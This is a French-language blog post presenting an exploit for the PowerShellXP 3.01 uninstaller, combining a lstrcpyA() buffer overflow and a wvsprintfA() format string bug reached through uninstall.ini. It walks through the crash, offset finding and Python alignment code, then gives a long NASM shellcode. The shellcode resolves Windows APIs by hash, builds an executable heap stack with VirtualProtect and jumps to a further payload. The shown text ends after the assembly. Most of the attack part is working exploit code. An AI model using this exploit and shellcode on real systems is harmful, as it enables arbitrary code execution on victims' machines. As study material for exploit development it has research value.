<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>[Exploit] PowerShell 3.01 0day</title>
  <meta name="description" content="Cheers to sec0d and it’s members for finding the vuln’ :). Thanks to kmkz and ZadYRee for support ;).">

  <link rel="stylesheet" href="/assets/css/main.css">
  <link rel="canonical" href="/2010/12/11/exploit-powershell-301-0day.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-9302170278788846",
          enable_page_level_ads: true
     });
</script>


  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-16686496-2');
</script>

</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">[Exploit] PowerShell 3.01 0day</h1>
    <p class="post-meta"><time datetime="2010-12-11T14:45:00+01:00" itemprop="datePublished">Dec 11, 2010</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p><span class="Apple-style-span" style="color: red;"><b>Cheers to sec0d and it’s members for finding the vuln’ :). Thanks to kmkz and ZadYRee for support ;).</b></span></p>

<h1 id="introduction">Introduction</h1>

<p>Aujourd’hui on va attaquer PowerShellXP 3.01.
C’est une extension du shell windows (je vous avouerais que je ne me suis pas penché plus que ça sur ses fonctionnalitées).
Ce soft souffre d’une vulnérabilité dans son désinstalleur comme nous allons le voir.</p>

<h1 id="trigger-it">Trigger it!</h1>

<p>On lance le désinstalleur et il nous affiche un gentil message :).</p>

<p><img src="/assets/img/powershell_1_MessageBox.png" alt="PowerShell Launch" /></p>

<p>Après recherche dans les différents fichier dans le dossier d’installation, on trouve une ligne intéressante dans le uninstall.ini.</p>

<p><img src="/assets/img/powershell_2_uninstall_ini.png" alt="PowerShell uninstall ini" /></p>

<p>On change le %s en %x juste pour voir … et coup de chance : format string ;).</p>

<p><img src="/assets/img/powershell_3_MessageBoxFormatString.png" alt="PowerShell format string" /></p>

<p>Reste plus qu’à crasher ça avec un pattern metasploit.</p>

<p><img src="/assets/img/powershell_4_Crash.png" alt="PowerShell crash" /></p>

<p>Recherche de l’offset avec !pvefindaddr suggest.</p>

<p><img src="/assets/img/powershell_5_Offset.png" alt="PowerShell offset" /></p>

<p>En regardant de plus près notre stack (screen 4), on voit qu’on a un pointeur sur notre pile
qui pointe directement sur notre buffer, all the win? :)
Le schéma de la stack :
<img src="/assets/img/powershell_stack1.png" alt="PowerShell stack1" /></p>

<p>Il nous suffira donc de trouver une instruction style pop/pop/ret pour retourner sur notre payload :).</p>

<p>On regarde en 0x4012AF et on remarque un appel à wvsprintfA() juste avant, on a localisé la vuln’ ;).</p>

<p><img src="/assets/img/powershell_6_VulnLocation.png" alt="PowerShell location" /></p>

<p>On remarque que l’addresse du buffer se trouve en 0x406E70 (huh?) et qu’on re-écrit EIP au bout de 5268 octets … bizarre. Donc on a EIP qui se trouve en 0x408304.</p>

<p>Regardons un peu qu’es-ce qu’on re-écrit :</p>

<p><img src="/assets/img/powershell_7_MemoryMap.png" alt="PowerShell memory map" /></p>

<p>On tape donc dans la section des imports. En regardant les imports vers 0x408304 … on a wvsprintfA() ;). A l’appel de celle-ci on redirige en fait notre code directos sur notre payload :).</p>

<p><img src="/assets/img/powershell_8_Imports.png" alt="PowerShell imports" /></p>

<p>En posant un breakpoint au début de la fonction appellée (0x40127C) on voit ça :</p>

<p><img src="/assets/img/powershell_stack2.png" alt="PowerShell stack2" /></p>

<p>Un peu plus bas sur la pile on peut voir qu’on a un retour vers 0x40330F, on va à cette addresse et on voit 1 appel avant notre fonction en 0x401512 qui fait un appel vers lstrcpyA() … et voilà d’où vient la vuln ;).</p>

<p><img src="/assets/img/powershell_9_0x40330F.png" alt="PowerShell vulnerable location" /></p>

<p>Et l’appel à notre lstrcpyA() :</p>

<p><img src="/assets/img/powershell_10_VulnFunction.png" alt="PowerShell vulnerable function" /></p>

<p>Donc pour résumer, on a 2 vulnérabilités:</p>

<ul>
  <li>un buffer overflow due à lstrcpyA()</li>
  <li>une format string s’en suivant due à l’appel de wvsprintfA() avec le format qu’on controle ;)</li>
</ul>

<p>Et voilà, maintenant il nous reste juste le code d’alignement pour notre shellcode
qu’on va encoder en utilisant l’alpha2.</p>

<h1 id="alignment-code">Alignment code</h1>

<p>Voilà le code d’alignement (veuillez vous reférer à mon article sur Xion Audio Player
exploitation pour de plus amples explication sur la manière de construire un code
d’alignement ;) ) :</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="code"><pre><span class="c1"># alignment code
# dec esp
# dec esp
# dec esp
# dec esp
</span><span class="n">align</span> <span class="o">=</span> <span class="s">'L'</span> <span class="o">*</span> <span class="mi">4</span>
<span class="c1"># pop esp (make esp point to data)
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span>
<span class="c1"># popad
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'a'</span>
<span class="n">align</span> <span class="o">+=</span> <span class="s">'K'</span> <span class="o">*</span> <span class="mi">18</span> <span class="c1"># junk byte :)
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'C'</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># ecx
</span><span class="n">align</span> <span class="o">+=</span> <span class="s">'C'</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># eax</span></pre></td></tr></tbody></table></code></pre></figure>

<p>J’ai choisi ESP en base address car plus facile à aligner (grâce à popad :)).
C’est pour cette raison que je fais pointer ESP vers la section .data directement ^^.</p>

<p>Bon maintenant on a tous les éléments en main pour construire notre exploit.</p>

<h1 id="pawned">Pawned?</h1>

<p>Aller on essaie avec une payload calculatrice classique ;) :</p>

<p><img src="/assets/img/powershell_11_AV-PUSH.png" alt="PowerShell AccessViolation PUSH" /></p>

<p>Ouch, “Access Violation” à cause d’un PUSH, c’est dû au fait qu’on atteint la fin de la section .data :s. On va solutionner ça avec un shellcode windows maison qui va allouer une nouvelle stack tout simplement :).</p>

<h1 id="lets-shellcode">Let’s shellcode!</h1>

<p>Pour cette partie je vous conseille de vous documenter sur le format de fichier exécutable PE et sur le shellcoding Windows (le document de skape est très bon :)).</p>

<p>Le déroulement d’un shellcode windows est généralement le suivant :</p>

<ul>
  <li>parcours du PEB à la recherche de la base de kernel32.dll</li>
  <li>resolutions des fonctions nécessaires de kernel32.dll
      - parsing de l’EAT à la recherche des exports correspondants</li>
  <li>appel des fonctions</li>
</ul>

<p>Un peu de parsing du fichier PE, on trouve nos imports et on fait nos appels
comme il faut :).</p>

<p>Ca nous donne la payload suivante :</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
</pre></td><td class="code"><pre><span class="n">bits</span> <span class="mi">32</span>

<span class="c">; defines</span>
<span class="n">PAGE_EXECUTE_READWRITE</span>  <span class="k">equ</span> <span class="mh">0x40</span>
<span class="n">HEAP_ZERO_MEMORY</span> <span class="k">equ</span> <span class="mh">0x8</span>
<span class="c">; 1KB</span>
<span class="n">KB</span> <span class="k">equ</span> <span class="mi">1024</span>
<span class="n">MB</span> <span class="k">equ</span> <span class="mi">1024</span><span class="o">*</span><span class="n">KB</span>

<span class="c">; 1MB stack</span>
<span class="n">MEMORY_SIZE</span> <span class="k">equ</span> <span class="n">MB</span>
<span class="n">GETSTUB_SIZE</span> <span class="k">equ</span> <span class="mi">13</span>
<span class="n">ENCODER_SIZE</span> <span class="k">equ</span> <span class="mi">51</span>
<span class="n">CURRENT_PAYLOAD_SIZE</span> <span class="k">equ</span> <span class="mi">861</span>
<span class="n">CURRENT_PAYLOAD_OFFSET</span> <span class="k">equ</span> <span class="n">CURRENT_PAYLOAD_SIZE</span> <span class="o">-</span> <span class="n">ENCODER_SIZE</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
<span class="n">PAYLOAD_SIZE</span> <span class="k">equ</span> <span class="mi">5268</span><span class="o">-</span><span class="n">CURRENT_PAYLOAD_OFFSET</span>

<span class="c">; hash : kernel32.dll</span>
<span class="n">GETPROCESSHEAPHASH</span>  <span class="k">equ</span>     <span class="mh">0xa80eecae</span>
<span class="n">VIRTUALPROTECTHASH</span>  <span class="k">equ</span>     <span class="mh">0x7946c61b</span>
<span class="n">LOADLIBRARYAHASH</span>    <span class="k">equ</span>     <span class="mh">0xec0e4e8e</span>

<span class="c">; hash : ntdll.dll</span>
<span class="n">RTLALLOCATEHEAPHASH</span>       <span class="k">equ</span>     <span class="mh">0x3e192526</span>

<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
    <span class="kr">global</span> <span class="n">main</span>

<span class="n">alloc_start</span><span class="o">:</span>
<span class="n">main</span><span class="o">:</span>
    <span class="c">; get current stub address</span>
    <span class="k">jmp</span> <span class="n">short</span> <span class="n">redirect</span>
    <span class="n">get_eip_ret</span><span class="o">:</span>
        <span class="k">pop</span> <span class="n">eax</span> <span class="c">; eip</span>
        <span class="k">jmp</span> <span class="n">current_payload</span>
    <span class="n">redirect</span><span class="o">:</span>
    <span class="k">call</span> <span class="n">get_eip_ret</span>

    <span class="n">current_payload</span><span class="o">:</span>
    <span class="k">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0x20</span>
    <span class="k">mov</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
    <span class="k">mov</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>

    <span class="c">; search kernel32 base address</span>
    <span class="k">call</span> <span class="n">find_kernel32</span>

    <span class="c">; resolve kernel32 symbols</span>
    <span class="c">; base of kernel32.dll</span>
    <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">add</span> <span class="n">esi</span><span class="p">,</span> <span class="n">kernel32_hash_table</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esi</span>
    <span class="k">add</span> <span class="n">ecx</span><span class="p">,</span> <span class="mi">12</span>     <span class="c">; 3 symbols to resolve</span>
    <span class="k">lea</span> <span class="n">edi</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">KERNEL32_FUNC_TABLE</span><span class="err">]</span>
    <span class="k">call</span> <span class="n">resolve_symbols_for_dll</span>

    <span class="c">; LoadLibraryA('ntdll.dll')</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ntdll_dll</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
    <span class="k">push</span> <span class="n">ebx</span>        <span class="c">; 'ntdll.dll'</span>
    <span class="k">call</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">LOADLIBRARYA</span><span class="err">]</span>

    <span class="c">; resolve ntdll symbols</span>
    <span class="c">; base of ntdll.dll</span>
    <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esi</span>    <span class="c">; restore clobbered ecx (due to LoadLibraryA)</span>
    <span class="k">add</span> <span class="n">ecx</span><span class="p">,</span> <span class="mi">4</span>      <span class="c">; 1 symbol to resolve</span>
    <span class="k">call</span> <span class="n">resolve_symbols_for_dll</span>

    <span class="c">; LoadLibraryA('user32.dll')</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">user32_dll</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
    <span class="k">push</span> <span class="n">ebx</span>        <span class="c">; 'user32.dll'</span>
    <span class="k">call</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">LOADLIBRARYA</span><span class="err">]</span>

    <span class="c">; resolve user32 symbols</span>
    <span class="c">; base of user32.dll</span>
    <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esi</span>    <span class="c">; restore clobbered ecx (due to LoadLibraryA)</span>
    <span class="k">add</span> <span class="n">ecx</span><span class="p">,</span> <span class="mi">4</span>      <span class="c">; 1 symbol to resolve</span>
    <span class="k">call</span> <span class="n">resolve_symbols_for_dll</span>

    <span class="c">; GetProcessHeap</span>
    <span class="k">call</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">GETPROCESSHEAP</span><span class="err">]</span>

    <span class="c">; RtlAllocateHeap() ... same result as HeapAlloc()</span>
    <span class="k">push</span> <span class="n">MEMORY_SIZE</span>        <span class="c">; dwBytes</span>
    <span class="k">push</span> <span class="n">HEAP_ZERO_MEMORY</span>   <span class="c">; dwFlags</span>
    <span class="k">push</span> <span class="n">eax</span>                <span class="c">; hHeap</span>
    <span class="k">call</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">RTLALLOCATEHEAP</span><span class="err">]</span>
    <span class="k">push</span> <span class="n">eax</span>                <span class="c">; save allocated memory address</span>

    <span class="c">; VirtualProtect()</span>
    <span class="k">lea</span> <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">OLDPROTECT</span><span class="err">]</span>
    <span class="k">push</span> <span class="n">ecx</span>                        <span class="c">; lpflOldProtect</span>
    <span class="k">push</span> <span class="n">PAGE_EXECUTE_READWRITE</span>     <span class="c">; flNewProtect</span>
    <span class="k">push</span> <span class="n">MEMORY_SIZE</span>                <span class="c">; dwSize</span>
    <span class="k">push</span> <span class="n">eax</span>                        <span class="c">; lpAddress</span>
    <span class="k">call</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">VIRTUALPROTECT</span><span class="err">]</span>
    
    <span class="c">; get allocated memory address back :)</span>
    <span class="k">pop</span> <span class="n">edx</span>

    <span class="c">; set new stack :)</span>
    <span class="k">add</span> <span class="n">edx</span><span class="p">,</span> <span class="n">MEMORY_SIZE</span>
    <span class="k">push</span> <span class="n">edx</span>
    <span class="k">pop</span> <span class="n">esp</span>

    <span class="c">; show message :)</span>
    <span class="k">push</span> <span class="mi">0</span>                              <span class="c">; uType = MB_OK</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">pawnTitle</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
    <span class="k">push</span> <span class="n">ebx</span>                            <span class="c">; lpCaption = 'Hacked! :)'</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">pawnMsg</span> <span class="o">-</span> <span class="n">GETSTUB_SIZE</span>
    <span class="k">push</span> <span class="n">ebx</span>                            <span class="c">; lpText = 'Pawned by m_101'</span>
    <span class="k">push</span> <span class="mi">0</span>                              <span class="c">; hWnd = NULL = no owner window</span>
    <span class="k">call</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">MESSAGEBOX</span><span class="err">]</span>

    <span class="c">; we compute payload address for jmp</span>
    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">ADDRESS_STUB</span><span class="err">]</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">CURRENT_PAYLOAD_OFFSET</span>
    <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ebx</span>

    <span class="c">; jmp to payload</span>
    <span class="k">jmp</span> <span class="n">eax</span>

<span class="c">; get kernel32 module base address from PEB</span>
<span class="c">; void* find_kernel32(void)</span>
<span class="n">find_kernel32</span><span class="o">:</span>
    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
    <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">fs</span><span class="o">:</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x30</span><span class="err">]</span>       <span class="c">; eax = PEB</span>
    <span class="k">js</span> <span class="n">short</span> <span class="n">method_9x</span>

    <span class="n">method_nt</span><span class="o">:</span>
        <span class="k">mov</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">ch</span><span class="err">]</span>      <span class="c">; PEB_LDR_DATA *</span>
        <span class="k">mov</span>   <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">1</span><span class="n">ch</span><span class="err">]</span>      <span class="c">; PEB_LDR_DATA.InInitializationOrderModuleList</span>
        <span class="k">lodsd</span>                       <span class="c">; eax = [esi]   get kernel32 entry</span>
        <span class="k">mov</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">08</span><span class="n">h</span><span class="err">]</span>      <span class="c">; kernel32 DllBase</span>
        <span class="k">jmp</span> <span class="n">short</span> <span class="n">kernel32_ptr_found</span>

    <span class="n">method_9x</span><span class="o">:</span>
        <span class="k">mov</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">34</span><span class="n">h</span><span class="err">]</span>
        <span class="k">lea</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">7</span><span class="n">ch</span><span class="err">]</span>
        <span class="k">mov</span>   <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">3</span><span class="n">ch</span><span class="err">]</span>
    <span class="n">kernel32_ptr_found</span><span class="o">:</span>
    <span class="k">ret</span>

<span class="c">; resolve function address</span>
<span class="c">; void* find_function (void *base, unsigned int hash)</span>
<span class="n">find_function</span><span class="o">:</span>
    <span class="k">pushad</span>                          <span class="c">; save all registers ^^</span>
    <span class="k">mov</span> <span class="n">ebp</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span> <span class="o">+</span> <span class="mh">0x24</span><span class="err">]</span>           <span class="c">; VA base address of module</span>
    <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="err">]</span>           <span class="c">; pe header</span>
    <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span> <span class="o">+</span> <span class="n">eax</span> <span class="o">+</span> <span class="mh">0x78</span><span class="err">]</span>     <span class="c">; get export address table</span>
    <span class="k">add</span> <span class="n">edx</span><span class="p">,</span> <span class="n">ebp</span>                    <span class="c">; VA of EAT</span>
    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x18</span><span class="err">]</span>           <span class="c">; number of exported functions</span>
    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="err">]</span>           <span class="c">; name table</span>
    <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebp</span>                    <span class="c">; VA of name table</span>

    <span class="n">find_function_loop</span><span class="o">:</span>
        <span class="k">jecxz</span> <span class="n">find_function_finished</span>    <span class="c">; if ecx == 0 then unresolved</span>
        <span class="k">dec</span> <span class="n">ecx</span>                         <span class="c">; one entry less to check</span>
        <span class="k">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="err">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="n">ecx</span> <span class="o">*</span> <span class="mi">4</span><span class="err">]</span>        <span class="c">; name offset of current symbol</span>
        <span class="k">add</span> <span class="n">esi</span><span class="p">,</span> <span class="n">ebp</span>                    <span class="c">; VA of name</span>

        <span class="n">compute_hash</span><span class="o">:</span>
            <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>                <span class="c">; hash = 0</span>
            <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>                <span class="c">; character</span>
            <span class="k">cld</span>                         <span class="c">; assure it increment by setting DF=0</span>

            <span class="n">compute_hash_again</span><span class="o">:</span>
                <span class="k">lodsb</span>                       <span class="c">;</span>
                <span class="k">test</span> <span class="n">al</span><span class="p">,</span> <span class="n">al</span>                 <span class="c">; end of string reached?</span>
                <span class="k">jz</span> <span class="n">compute_hash_finished</span>    <span class="c">; if yes, finished to hash</span>
                <span class="k">ror</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0xd</span>                <span class="c">; rotate right for 13 bits</span>
                <span class="k">add</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>                <span class="c">; hash</span>
            <span class="k">jmp</span> <span class="n">compute_hash_again</span>
        <span class="n">compute_hash_finished</span><span class="o">:</span>

        <span class="n">find_function_compare</span><span class="o">:</span>
            <span class="k">cmp</span> <span class="n">edi</span><span class="p">,</span> <span class="err">[</span><span class="n">esp</span> <span class="o">+</span> <span class="mh">0x28</span><span class="err">]</span>           <span class="c">; does it match requested hash?</span>
    <span class="k">jnz</span> <span class="n">find_function_loop</span>                  <span class="c">; if not we continue searching</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x24</span><span class="err">]</span>               <span class="c">; ordinal table offset</span>
        <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebp</span>                        <span class="c">; VA of ordinal table offset</span>
        <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">ecx</span><span class="err">]</span>             <span class="c">; current ordinal</span>
        <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="err">[</span><span class="n">edx</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="err">]</span>               <span class="c">; address table offset</span>
        <span class="k">add</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebp</span>                        <span class="c">; VA of address table offset</span>
        <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebx</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">ecx</span><span class="err">]</span>            <span class="c">; relative function offset</span>
        <span class="k">add</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ebp</span>                        <span class="c">; function VA yeepee!</span>
        <span class="k">mov</span> <span class="err">[</span><span class="n">esp</span> <span class="o">+</span> <span class="mh">0x1c</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>               <span class="c">; patch saved eax value</span>
    <span class="n">find_function_finished</span><span class="o">:</span>

    <span class="k">popad</span>                                   <span class="c">; restore :)</span>
    <span class="k">ret</span> <span class="mi">8</span>

<span class="c">; void resolve_symbols_for_dll (edx = base of dll, edi = resolved addresses, esi = hash table address, ecx == end of hash table)</span>
<span class="n">resolve_symbols_for_dll</span><span class="o">:</span>
    <span class="k">lodsd</span>
    <span class="k">push</span> <span class="n">eax</span>
    <span class="k">push</span> <span class="n">edx</span>
    <span class="k">call</span> <span class="n">find_function</span>
    <span class="k">mov</span> <span class="p">[edi],</span> <span class="n">eax</span>
    <span class="k">add</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0x4</span>        <span class="c">; go forward in address table</span>
    <span class="k">cmp</span> <span class="n">esi</span><span class="p">,</span> <span class="n">ecx</span>
    <span class="k">jnz</span> <span class="n">resolve_symbols_for_dll</span>
    <span class="k">ret</span>

<span class="c">; offset compared to ebp ;)</span>
<span class="c">; kernel32</span>
<span class="n">KERNEL32_FUNC_TABLE</span>     <span class="k">equ</span> <span class="mi">0</span>
<span class="n">GETPROCESSHEAP</span>          <span class="k">equ</span> <span class="mi">0</span>
<span class="n">VIRTUALPROTECT</span>          <span class="k">equ</span> <span class="mi">4</span>
<span class="n">LOADLIBRARYA</span>            <span class="k">equ</span> <span class="mi">8</span>

<span class="c">; ntdll</span>
<span class="n">NTDLL_FUNC_TABLE</span>    <span class="k">equ</span> <span class="mi">12</span>
<span class="n">RTLALLOCATEHEAP</span>     <span class="k">equ</span> <span class="mi">12</span>

<span class="c">; user32</span>
<span class="n">USER32_FUNC_TABLE</span>   <span class="k">equ</span> <span class="mi">16</span>
<span class="n">MESSAGEBOX</span>          <span class="k">equ</span> <span class="mi">16</span>

<span class="c">;</span>
<span class="n">ADDRESS_STUB</span>        <span class="k">equ</span> <span class="mi">20</span>
<span class="n">KERNEL32_BASE</span>       <span class="k">equ</span> <span class="mi">24</span>
<span class="n">OLDPROTECT</span>          <span class="k">equ</span> <span class="mi">28</span>

<span class="c">; hash tables</span>
<span class="n">kernel32_hash_table</span><span class="o">:</span>
    <span class="n">GetProcessHeapHash</span>  <span class="kt">dd</span>     <span class="mh">0xa80eecae</span>
    <span class="n">VirtualProtectHash</span>  <span class="kt">dd</span>     <span class="mh">0x7946c61b</span>
    <span class="n">LoadLibraryAHash</span>    <span class="kt">dd</span>     <span class="mh">0xec0e4e8e</span>

<span class="n">ntdll_hash_table</span><span class="o">:</span>
    <span class="n">RtlAllocateHeapHash</span> <span class="kt">dd</span>     <span class="mh">0x3e192526</span>

<span class="n">user32_hash_table</span><span class="o">:</span>
    <span class="n">MessageBox</span>  <span class="kt">dd</span>  <span class="mh">0xbc4da2a8</span>

<span class="c">; dll to load</span>
<span class="n">ntdll_dll</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span><span class="err">'</span><span class="p">,</span> <span class="mi">0</span>
<span class="n">user32_dll</span><span class="o">:</span> <span class="kt">db</span> <span class="err">'</span><span class="n">user32</span><span class="p">.</span><span class="n">dll</span><span class="err">'</span><span class="p">,</span> <span class="mi">0</span>

